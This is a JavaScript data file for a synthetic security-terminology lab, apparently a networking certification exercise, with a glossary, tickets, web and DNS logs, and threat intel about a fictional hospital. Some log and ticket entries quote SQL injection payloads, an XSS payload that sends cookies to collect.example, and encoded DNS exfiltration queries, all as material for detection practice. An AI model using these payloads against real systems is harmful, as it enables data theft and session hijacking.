'use strict';
/* CyberLab — N10-009 Lesson 4.4 Security Terminology (static port v4).
   Ported 1:1 from the original single-file lab. ALL data is synthetic. */

/* ============ js/data.js — ALL lab content, no logic ============ */
const PILLARS = {understand:'Understand', identify:'Identify &amp; Analyze', detect:'Detect', mitigate:'Mitigate'};
const PILLAR_CLASS = {understand:'badge p-u', identify:'badge p-i', detect:'badge p-d', mitigate:'badge p-m'};


/* ---------- glossary (C2) ---------- */
const GLOSSARY = [
  ['Threat','Any potential person, group or event that could cause harm to an asset. A threat is the "who or what" — it has not necessarily acted yet.'],
  ['Vulnerability','A weakness in a system, process, or control that a threat could take advantage of. The "where we are weak."'],
  ['Exploit','The specific code, technique, or action that takes advantage of a vulnerability. The "how."'],
  ['Risk','The combination of the likelihood that harm occurs and the impact it would have (Risk = Likelihood × Impact).'],
  ['Confidentiality','CIA pillar: keeping data accessible only to authorized parties; preventing unauthorized disclosure.'],
  ['Integrity','CIA pillar: guarding against improper modification; ensuring data is accurate, complete, and trustworthy.'],
  ['Availability','CIA pillar: ensuring systems and data are accessible when authorized users need them.'],
  ['Threat actor','The entity (person, group, or insiders) that carries out a threat.'],
  ['Attack vector','The path or means a threat actor uses to reach a target (phishing email, exposed service, malicious file).'],
  ['Mitigation','Any action or control that reduces the likelihood or the impact of harm — lowering risk.'],
  ['Compensating control','An alternative safeguard used when the preferred control (e.g., a patch) is not yet possible.'],
  ['Likelihood / Impact','The two factors of risk: how probable the harm is, and how much damage it would cause.']
];

/* ---------- interactive environment data (C3) ---------- */
const TICKETS = [
  {id:'TKT-2041', title:'Vulnerability scan finding — WEB-01', body:'Monthly authenticated scan found Apache Struts 2.5.20 on WEB-01. Vendor advisory states versions below 2.5.30 are affected by a remote code execution flaw. No attack observed yet. Owner: Web Team. SLA: patch within 14 days.'},
  {id:'TKT-2042', title:'WAF alert — malicious POST to /orders.php', body:'WAF blocked and logged a POST to /orders.php containing the payload <code>1\' UNION SELECT credit_card, ssn FROM patients--</code>. Source 203.0.113.77. Request returned HTTP 500 on one retry before block.WEB-01 backend is the orders application.'},
  {id:'TKT-2043', title:'Intel bulletin — healthcare VPN targeting', body:'Sector ISAC bulletin: activity group tracked as "COBALT SPARROW" is compromising healthcare edge VPN appliances using known unpatched flaws, then staging ransomware. Indicators of compromise attached. Meridian Regional Health uses one of the affected appliance models.'},
  {id:'TKT-2044', title:'Risk register — phishing-driven breach', body:'Annual risk assessment entry R-118: credential-phishing campaign leads to patient-record disclosure. Estimated likelihood 3/5, financial+regulatory impact $2.4M. Current residual risk rated High. Proposed treatment: organization-wide MFA rollout.'},
  {id:'TKT-2045', title:'Helpdesk — EHR slow during backup window', body:'Clinicians report the EHR becomes unresponsive 22:00–23:30 when the backup job runs on the same host. No security indicators. This is an availability/performance complaint, not an incident.'},
  {id:'TKT-2046', title:'Config audit — APP-02 remote access exposure', body:'Configuration audit of APP-02 found: RDP reachable from the Internet, account lockout threshold disabled, TLS 1.3 correctly enabled, audit logging enabled, backups scheduled nightly. Two of the six findings are weaknesses.'}
];
const LOGS = [
  ['L01','02:14:07','203.0.113.77','GET','/portal','200'],
  ['L02','02:14:52','203.0.113.77','GET','/styles/main.css','200'],
  ['L03','02:15:03','203.0.113.77','GET','/favicon.ico','200'],
  ['L04','02:15:40','203.0.113.77','GET','/backup/status','200'],
  ['L05','02:16:12','203.0.113.77','POST','/orders.php (payload: 1\' UNION SELECT credit_card, ssn FROM patients--)','500'],
  ['L06','02:16:13','203.0.113.77','GET','/products.php?id=1\' OR \'1\'=\'1','500'],
  ['L07','02:18:44','198.51.100.23','GET','/robots.txt','200'],
  ['L08','02:21:09','198.51.100.23','POST','/api/orders','200'],
  ['L09','02:24:37','203.0.113.77','POST','/search (payload: <scr'+'ipt>document.location="http://collect.example/steal?c="+document.cookie)</scr'+'ipt>','302'],
  ['L10','02:25:02','203.0.113.77','GET','/health','200'],
  ['L11','02:26:19','198.51.100.23','GET','/reports/summary','200']
];
const ASSETS = [
  {id:'AS-01', name:'EHR Database (Oracle, srv-db01)', desc:'Stores every patient record. Primary concern: unauthorized disclosure.', cia:'Confidentiality'},
  {id:'AS-02', name:'Lab Results Integration Engine', desc:'Transforms analyzer output into stored results. Wrong units = wrong care. Primary concern: improper modification.', cia:'Integrity'},
  {id:'AS-03', name:'Patient Portal (portal.meridian-hosp.example)', desc:'Scheduling and results access for patients. Primary concern: uptime and reachability.', cia:'Availability'},
  {id:'AS-04', name:'Offline Backup Vault', desc:'Nightly offline copies. Protects the ability to recover accurate data and to keep it private.', cia:'Confidentiality + Integrity'},
  {id:'AS-05', name:'Payment Gateway (PCI scope)', desc:'Cardholder data flows. Primary concern: no unauthorized reading of card data.', cia:'Confidentiality'}
];
const INTEL = [
  {tag:'INTEL', text:'Sector ISAC: "COBALT SPARROW" — synthetic actor — targets healthcare VPN gateways and EHR edge servers; uses OGNL-style header injection against legacy web frameworks.'},
  {tag:'BULLETIN', text:'Vendor advisory AV-2026-1141: web framework versions below 2.5.30 vulnerable to remote code execution via crafted Content-Type headers.'},
  {tag:'PATCH DATA', text:'Patch bulletin P-2611: CVE-2026-1001 affects Patient Portal 4.1.0–4.1.7 · CVE-2026-1002 affects VPN Gateway 2.x only · CVE-2026-1003 affects DB Client 11.x only · CVE-2026-1004 affects Payment Gateway 5.0–5.2.'},
  {tag:'INVENTORY SNAPSHOT', text:'Patient Portal v4.1.5 · VPN Gateway v3.2 · DB Client v12.4 · Payment Gateway v5.1 · WEB-01 web framework 2.5.20.'}
];
const DNSLOG = [
  ['14:00:02','WS-201','time.pool.example','A','32','NTP clock sync'],
  ['14:00:11','SRV-07','av-defs.vendor-updates.example','A','88','AV definition check'],
  ['14:00:19','PRN-02','status.printer-portal.example','A','64','Printer status poll'],
  ['14:01:00','WS-114','dGVsZW1ldHJ5LWJhdGNoLTkxNTQ.meridian-hosp.example','TXT','243','query id 0x1a'],
  ['14:02:00','WS-114','cGF0aWVudC1yZWNvcmRzLmV4cG9ydC0wMg.meridian-hosp.example','TXT','240','query id 0x2b'],
  ['14:03:00','WS-114','Y3JlZGVudGlhbC1jYWNoZS1wYXJ0LTM.meridian-hosp.example','TXT','241','query id 0x3c'],
  ['14:04:00','WS-114','ZGItdGFibGUtZHJvcC1wYXJ0LTQ.meridian-hosp.example','TXT','238','query id 0x4d'],
  ['14:05:00','WS-114','Y3JlZGVudGlhbC1jYWNoZS1wYXJ0LTU.meridian-hosp.example','TXT','242','query id 0x5e'],
  ['14:05:12','WS-114','www.meridian-hosp.example','A','52','normal lookup'],
  ['14:06:00','WS-201','time.pool.example','A','32','NTP clock sync']
];
const MATRIX_ROWS = [
  {l:5, cells:['Medium','High','High','Critical','Critical']},
  {l:4, cells:['Medium','Medium','High','Critical','Critical']},
  {l:3, cells:['Low','Medium','Medium','High','High']},
  {l:2, cells:['Low','Low','Medium','Medium','High']},
  {l:1, cells:['Low','Low','Low','Low','Medium']}
];
